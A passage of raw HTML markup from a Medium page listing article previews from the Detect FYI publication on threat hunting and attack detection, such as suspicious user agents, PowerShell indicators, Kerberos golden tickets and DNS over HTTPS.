0-2.027-.64-1.92-.853l2.027-7.68-.64-.214-1.387 1.494-.427-.427c.534-1.173 1.707-2.667 2.774-2.667.533 0 2.24.534 2.133.854l-2.133 7.786.533.214 1.6-1.067.427.427c-.64 1.066-1.92 2.133-2.987 2.133m2.347-11.733c-.96 0-1.387-.64-1.387-1.387 0-1.067.747-1.92 1.493-1.92.854 0 1.387.64 1.387 1.493-.107 1.067-.747 1.814-1.493 1.814"></path></svg></span></div></div></div></div></span><div class="zm us ac zk ht zl"><div class="zn"><button class="bg b ec ab bl zx zy ya zz ni ne uz fc fd fe aba abb abc fh fi fj fk bn fl fm" data-testid="CancelResponseButton">Cancel</button></div><button class="bg b ec ab ut zx uv uw ux uy uz fc fd va vb vc fh fi fj fk bn fl fm" disabled="" data-testid="ResponseRespondButton">Respond</button></div></div></div></div></div></div></div></div></div></div></div></div><div class="xq xr xs xt xu m bx"><div class="ac ci"><div class="cp bi ih ii ij ik"><div class="abn abo dt du dv ia m"><h2 class="bg gw pt pv gy pw py ha pz qb qc qd qf qg qh qj qk bl">More from mthcht and Detect FYI</h2></div><div class="abp ac mg kx abq abr abs abt abu abv abw abx aby abz aca acb acc acd ace"><div class="acf acg ach wx aci acj ack ww acl acm acn aco acp acq acr acs act acu acv acw acx"><div class="acy acz ada adb adc ed m"><article class="ed" data-testid="post-preview"><div class="ed vt m"><div class="bi ed"><div class="ed m"><div class="fr ed add ade adf adg adh adi adj adk adl adm adn ado adp" role="link" data-href="https://detect.fyi/threat-hunting-suspicious-user-agents-3dd764470bd0" tabindex="0"><div class="adq"><div aria-label="Threat Hunting - Suspicious User Agents"></div></div><div class="adr ac ci cv"><div class="ac cv zd bi adz aea aeb aec"><div class="aed aee aef aeg aeh ac r"><div class="vl m"><div><div class="m" aria-describedby="97" aria-labelledby="97" role="tooltip"><div tabindex="-1" class="bf"><a href="https://detect.fyi/?source=post_page---author_recirc--a4206e8a4bc8----0---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" rel="noopener follow"><div class="fr"><img alt="Detect FYI" class="de hw m aej aei" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*ayMhoNccbO0IxQ1UPFv0SA.png"><div class="hw m aei aej fw o gj gk"></div></div></a></div></div></div></div><div class="wy m gc"><p class="bg b ec ab eb">In</p></div><div class="m"><div><div class="m" aria-describedby="98" aria-labelledby="98" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at kv ac r" href="https://detect.fyi/?source=post_page---author_recirc--a4206e8a4bc8----0---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" rel="noopener follow"><p class="bg b ec ab ga aek gm ael aem aen aeo aep bl">Detect FYI</p></a></div></div></div></div><div class="aeq m"><p class="bg b ec ab eb">by</p></div><div><div class="m" aria-describedby="99" aria-labelledby="99" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at kv ac r" href="https://mthcht.medium.com/?source=post_page---author_recirc--a4206e8a4bc8----0---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" rel="noopener follow"><p class="bg b ec ab ga aek gm ael aem aen aeo aep bl">mthcht</p></a></div></div></div></div><div class="aer m aes aet aeu aev aew ib"><div class="aex aey aez afa afb afc afd afe"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://detect.fyi/threat-hunting-suspicious-user-agents-3dd764470bd0?source=post_page---author_recirc--a4206e8a4bc8----0---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" data-discover="true"><div title=""><h2 class="bg jb pt pv aff afg afh afi afj afk gy pw py afl afm afn afo afp afq ha hb hc afr afs aft afu afv afw hd he hf afx afy afz aga agb agc hg hh hi agd age agf agg agh agi hj aep bl">Threat Hunting - Suspicious User Agents</h2></div><div class="agj m"><h3 class="bg b hm ab ga agk gm ael agl aen aep eb">Hunting for Suspicious User Agents with Splunk</h3></div></a></div></div><span class="bg b ec ab eb"><div class="wp ac cw ag"><div class="ac r ago"><span>Jan 1, 2024</span><div class=""><div class="fr agm do ac r"><div class="fw ht agn ac r ago"><div class="fn do agp m de"></div></div><a class="fw nc agn ac r ago" tabindex="-1" rel="noopener follow" href="https://detect.fyi/threat-hunting-suspicious-user-agents-3dd764470bd0?source=post_page---author_recirc--a4206e8a4bc8----0---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" data-discover="true"><div><div class="ac" aria-describedby="246" aria-labelledby="246" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r agq"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>262</span></div></div></div></div><div><div class="ac" aria-describedby="100" aria-labelledby="100" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r agq"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#6B6B6B" aria-labelledby="response-filled-16px-desc" viewBox="0 0 16 16"><desc id="response-filled-16px-desc">A response icon</desc><path fill="#6B6B6B" d="M12.344 11.458A5.28 5.28 0 0 0 14 7.526C14 4.483 11.391 2 8.051 2S2 4.483 2 7.527c0 3.051 2.712 5.526 6.059 5.526a6.6 6.6 0 0 0 1.758-.236q.255.223.554.414c.784.51 1.626.768 2.512.768a.37.37 0 0 0 .355-.214.37.37 0 0 0-.03-.384 4.7 4.7 0 0 1-.857-1.958v.014z"></path></svg><span>3</span></div></div></div></div></a></div></div></div><div class="ac r ags agt"><div class="agr"></div><div class=""><div><div class="bn" aria-describedby="101" aria-labelledby="101" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F3dd764470bd0&amp;operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fthreat-hunting-suspicious-user-agents-3dd764470bd0&amp;source=---author_recirc--a4206e8a4bc8----0-----------------bookmark_preview----aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" rel="noopener follow"><span class="agr"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb ni" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span><div class="k j e"><div class="xh bi xv ng"></div></div></div></div></div></div></div></div></article></div></div><div class="acf acg ach wx aci acj ack ww acl acm acn aco acp acq acr acs act acu acv acw acx"><div class="acy acz ada adb adc ed m"><article class="ed" data-testid="post-preview"><div class="ed vt m"><div class="bi ed"><div class="ed m"><div class="fr ed add ade adf adg adh adi adj adk adl adm adn ado adp" role="link" data-href="https://detect.fyi/introducing-powershell-exposed-4974fe712117" tabindex="0"><div class="adq"><div aria-label="Introducing > PowerShell.Exposed"></div></div><div class="adr ac ci cv"><div class="ac cv zd bi adz aea aeb aec"><div class="aed aee aef aeg aeh ac r"><div class="vl m"><div><div class="m" aria-describedby="102" aria-labelledby="102" role="tooltip"><div tabindex="-1" class="bf"><a href="https://detect.fyi/?source=post_page---author_recirc--a4206e8a4bc8----1---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" rel="noopener follow"><div class="fr"><img alt="Detect FYI" class="de hw m aej aei" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*ayMhoNccbO0IxQ1UPFv0SA.png"><div class="hw m aei aej fw o gj gk"></div></div></a></div></div></div></div><div class="wy m gc"><p class="bg b ec ab eb">In</p></div><div class="m"><div><div class="m" aria-describedby="103" aria-labelledby="103" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at kv ac r" href="https://detect.fyi/?source=post_page---author_recirc--a4206e8a4bc8----1---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" rel="noopener follow"><p class="bg b ec ab ga aek gm ael aem aen aeo aep bl">Detect FYI</p></a></div></div></div></div><div class="aeq m"><p class="bg b ec ab eb">by</p></div><div><div class="m" aria-describedby="104" aria-labelledby="104" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at kv ac r" href="https://ateixei.medium.com/?source=post_page---author_recirc--a4206e8a4bc8----1---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" rel="noopener follow"><p class="bg b ec ab ga aek gm ael aem aen aeo aep bl">Alex Teixeira</p></a></div></div></div></div><div class="aer m aes aet aeu aev aew ib"><div class="aex aey aez afa afb afc afd afe"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://detect.fyi/introducing-powershell-exposed-4974fe712117?source=post_page---author_recirc--a4206e8a4bc8----1---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" data-discover="true"><div title=""><h2 class="bg jb pt pv aff afg afh afi afj afk gy pw py afl afm afn afo afp afq ha hb hc afr afs aft afu afv afw hd he hf afx afy afz aga agb agc hg hh hi agd age agf agg agh agi hj aep bl">Introducing &gt; PowerShell.Exposed</h2></div><div class="agj m"><h3 class="bg b hm ab ga agk gm ael agl aen aep eb">Community-driven pattern-based detection indicators</h3></div></a></div></div><span class="bg b ec ab eb"><div class="wp ac cw ag"><div class="ac r ago"><span>Jan 20</span><div class=""><div class="fr agm do ac r"><div class="fw ht agn ac r ago"><div class="fn do agp m de"></div></div><a class="fw nc agn ac r ago" tabindex="-1" rel="noopener follow" href="https://detect.fyi/introducing-powershell-exposed-4974fe712117?source=post_page---author_recirc--a4206e8a4bc8----1---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" data-discover="true"><div><div class="ac" aria-describedby="248" aria-labelledby="248" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r agq"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>21</span></div></div></div></div><div><div class="ac" aria-describedby="105" aria-labelledby="105" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r agq"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#6B6B6B" aria-labelledby="response-filled-16px-desc" viewBox="0 0 16 16"><desc id="response-filled-16px-desc">A response icon</desc><path fill="#6B6B6B" d="M12.344 11.458A5.28 5.28 0 0 0 14 7.526C14 4.483 11.391 2 8.051 2S2 4.483 2 7.527c0 3.051 2.712 5.526 6.059 5.526a6.6 6.6 0 0 0 1.758-.236q.255.223.554.414c.784.51 1.626.768 2.512.768a.37.37 0 0 0 .355-.214.37.37 0 0 0-.03-.384 4.7 4.7 0 0 1-.857-1.958v.014z"></path></svg><span>2</span></div></div></div></div></a></div></div></div><div class="ac r ags agt"><div class="agr"></div><div class=""><div><div class="bn" aria-describedby="106" aria-labelledby="106" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F4974fe712117&amp;operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fintroducing-powershell-exposed-4974fe712117&amp;source=---author_recirc--a4206e8a4bc8----1-----------------bookmark_preview----aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" rel="noopener follow"><span class="agr"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb ni" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span><div class="k j e"><div class="xh bi xv ng"></div></div></div></div></div></div></div></div></article></div></div><div class="acf acg ach wx aci acj ack ww acl acm acn aco acp acq acr acs act acu acv acw acx"><div class="acy acz ada adb adc ed m"><article class="ed" data-testid="post-preview"><div class="ed vt m"><div class="bi ed"><div class="ed m"><div class="fr ed add ade adf adg adh adi adj adk adl adm adn ado adp" role="link" data-href="https://detect.fyi/detection-of-kerberos-golden-ticket-attacks-via-velociraptor-cfe7cc26d3eb" tabindex="0"><div class="adq"><div aria-label="Detection of Kerberos Golden Ticket Attacks via Velociraptor"></div></div><div class="adr ac ci cv"><div class="ac cv zd bi adz aea aeb aec"><div class="aed aee aef aeg aeh ac r"><div class="vl m"><div><div class="m" aria-describedby="107" aria-labelledby="107" role="tooltip"><div tabindex="-1" class="bf"><a href="https://detect.fyi/?source=post_page---author_recirc--a4206e8a4bc8----2---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" rel="noopener follow"><div class="fr"><img alt="Detect FYI" class="de hw m aej aei" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*ayMhoNccbO0IxQ1UPFv0SA.png"><div class="hw m aei aej fw o gj gk"></div></div></a></div></div></div></div><div class="wy m gc"><p class="bg b ec ab eb">In</p></div><div class="m"><div><div class="m" aria-describedby="108" aria-labelledby="108" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at kv ac r" href="https://detect.fyi/?source=post_page---author_recirc--a4206e8a4bc8----2---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" rel="noopener follow"><p class="bg b ec ab ga aek gm ael aem aen aeo aep bl">Detect FYI</p></a></div></div></div></div><div class="aeq m"><p class="bg b ec ab eb">by</p></div><div><div class="m" aria-describedby="109" aria-labelledby="109" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at kv ac r" href="https://medium.com/@dfirloading?source=post_page---author_recirc--a4206e8a4bc8----2---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" rel="noopener follow"><p class="bg b ec ab ga aek gm ael aem aen aeo aep bl">dfirloading</p></a></div></div></div></div><div class="aer m aes aet aeu aev aew ib"><div class="aex aey aez afa afb afc afd afe"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://detect.fyi/detection-of-kerberos-golden-ticket-attacks-via-velociraptor-cfe7cc26d3eb?source=post_page---author_recirc--a4206e8a4bc8----2---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" data-discover="true"><div title=""><h2 class="bg jb pt pv aff afg afh afi afj afk gy pw py afl afm afn afo afp afq ha hb hc afr afs aft afu afv afw hd he hf afx afy afz aga agb agc hg hh hi agd age agf agg agh agi hj aep bl">Detection of Kerberos Golden Ticket Attacks via Velociraptor</h2></div><div class="agj m"><h3 class="bg b hm ab ga agk gm ael agl aen aep eb">Kerberos is a strange technology. Over the years, I’ve gone through its internal workings again and again, yet parts of it always seem to…</h3></div></a></div></div><span class="bg b ec ab eb"><div class="wp ac cw ag"><div class="ac r ago"><span>Jan 11</span><div class=""><div class="fr agm do ac r"><div class="fw ht agn ac r ago"><div class="fn do agp m de"></div></div><a class="fw nc agn ac r ago" tabindex="-1" rel="noopener follow" href="https://detect.fyi/detection-of-kerberos-golden-ticket-attacks-via-velociraptor-cfe7cc26d3eb?source=post_page---author_recirc--a4206e8a4bc8----2---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" data-discover="true"><div><div class="ac" aria-describedby="250" aria-labelledby="250" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r agq"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>2</span></div></div></div></div></a></div></div></div><div class="ac r ags agt"><div class="agr"></div><div class=""><div><div class="bn" aria-describedby="110" aria-labelledby="110" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fcfe7cc26d3eb&amp;operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fdetection-of-kerberos-golden-ticket-attacks-via-velociraptor-cfe7cc26d3eb&amp;source=---author_recirc--a4206e8a4bc8----2-----------------bookmark_preview----aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" rel="noopener follow"><span class="agr"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb ni" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span><div class="k j e"><div class="xh bi xv ng"></div></div></div></div></div></div></div></div></article></div></div><div class="acf acg ach wx aci acj ack ww acl acm acn aco acp acq acr acs act acu acv acw acx"><div class="acy acz ada adb adc ed m"><article class="ed" data-testid="post-preview"><div class="ed vt m"><div class="bi ed"><div class="ed m"><div class="fr ed add ade adf adg adh adi adj adk adl adm adn ado adp" role="link" data-href="https://detect.fyi/detecting-dns-over-https-30fddb55ac78" tabindex="0"><div class="adq"><div aria-label="Detecting DNS over HTTPS"></div></div><div class="adr ac ci cv"><div class="ac cv zd bi adz aea aeb aec"><div class="aed aee aef aeg aeh ac r"><div class="vl m"><div><div class="m" aria-describedby="111" aria-labelledby="111" role="tooltip"><div tabindex="-1" class="bf"><a href="https://detect.fyi/?source=post_page---author_recirc--a4206e8a4bc8----3---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" rel="noopener follow"><div class="fr"><img alt="Detect FYI" class="de hw m aej aei" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*ayMhoNccbO0IxQ1UPFv0SA.png"><div class="hw m aei aej fw o gj gk"></div></div></a></div></div></div></div><div class="wy m gc"><p class="bg b ec ab eb">In</p></div><div class="m"><div><div class="m" aria-describedby="112" aria-labelledby="112" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at kv ac r" href="https://detect.fyi/?source=post_page---author_recirc--a4206e8a4bc8----3---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" rel="noopener follow"><p class="bg b ec ab ga aek gm ael aem aen aeo aep bl">Detect FYI</p></a></div></div></div></div><div class="aeq m"><p class="bg b ec ab eb">by</p></div><div><div class="m" aria-describedby="113" aria-labelledby="113" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at kv ac r" href="https://mthcht.medium.com/?source=post_page---author_recirc--a4206e8a4bc8----3---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" rel="noopener follow"><p class="bg b ec ab ga aek gm ael aem aen aeo aep bl">mthcht</p></a></div></div></div></div><div class="aer m aes aet aeu aev aew ib"><div class="aex aey aez afa afb afc afd afe"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://detect.fyi/detecting-dns-over-https-30fddb55ac78?source=post_page---author_recirc--a4206e8a4bc8----3---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" data-discover="true"><div title=""><h2 class="bg jb pt pv aff afg afh afi afj afk gy pw py afl afm afn afo afp afq ha hb hc afr afs aft afu afv afw hd he hf afx afy afz aga agb agc hg hh hi agd age agf agg agh agi hj aep bl">Detecting DNS over HTTPS</h2></div><div class="agj m"><h3 class="bg b hm ab ga agk gm ael agl aen aep eb">Detecting DNS over HTTPS - DoH with a SIEM - logs analysis</h3></div></a></div></div><span class="bg b ec ab eb"><div class="wp ac cw ag"><div class="ac r ago"><span>Nov 7, 2023</span><div class=""><div class="fr agm do ac r"><div class="fw ht agn ac r ago"><div class="fn do agp m de"></div></div><a class="fw nc agn ac r ago" tabindex="-1" rel="noopener follow" href="https://detect.fyi/detecting-dns-over-https-30fddb55ac78?source=post_page---author_recirc--a4206e8a4bc8----3---------------------aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" data-discover="true"><div><div class="ac" aria-describedby="251" aria-labelledby="251" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r agq"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>146</span></div></div></div></div><div><div class="ac" aria-describedby="114" aria-labelledby="114" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r agq"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#6B6B6B" aria-labelledby="response-filled-16px-desc" viewBox="0 0 16 16"><desc id="response-filled-16px-desc">A response icon</desc><path fill="#6B6B6B" d="M12.344 11.458A5.28 5.28 0 0 0 14 7.526C14 4.483 11.391 2 8.051 2S2 4.483 2 7.527c0 3.051 2.712 5.526 6.059 5.526a6.6 6.6 0 0 0 1.758-.236q.255.223.554.414c.784.51 1.626.768 2.512.768a.37.37 0 0 0 .355-.214.37.37 0 0 0-.03-.384 4.7 4.7 0 0 1-.857-1.958v.014z"></path></svg><span>2</span></div></div></div></div></a></div></div></div><div class="ac r ags agt"><div class="agr"></div><div class=""><div><div class="bn" aria-describedby="115" aria-labelledby="115" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F30fddb55ac78&amp;operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fdetecting-dns-over-https-30fddb55ac78&amp;source=---author_recirc--a4206e8a4bc8----3-----------------bookmark_preview----aa7d2e2d_b4e1_4f57_a4f3_ca83d13d0927--------------" rel="noopener follow"><span class="agr"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb ni" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span></div></div></div></div></div></div></article></div></div></div><div class="xh bi xv dr ds agu agv agw"></div><div class="ac tz uc kg ki kk"><a class="bg b bh ab bl uu zy ya zz ni ne uz fc fd fe aba abb abc fh agx agy agz aha ahb fi fj fk bn fl fm" href="https://mthcht.medium.com/?source=post_page---author_recirc--a4206e8a4bc8---------------------------------------" rel="noopener follow"><div class="m fm">See all from mthcht</div></a><div class="ahc ahd ahe ahf ahg ahh ahi ahj ahk na m"><a class="bg b bh ab bl uu zy ya zz ni ne uz fc fd fe aba abb abc fh agx agy agz aha ahb fi fj fk bn fl fm" href="https://detect.fyi/?source=post_page---author_recirc--a4206e8a4bc8---------------------------------------" rel="noopener follow"><div class="m fm">See all from Detect FYI</div></a></div></div></div></div><div class="xh bi xv ahl ahm ahn aho ahp"></div><div class="ac ci"><div class="cp bi ih ii ij ik"><div class="ahq ahr m"><h2 class="bg gw pt pv gy pw py ha pz qb qc qd qf qg qh qj qk bl">Recommended from 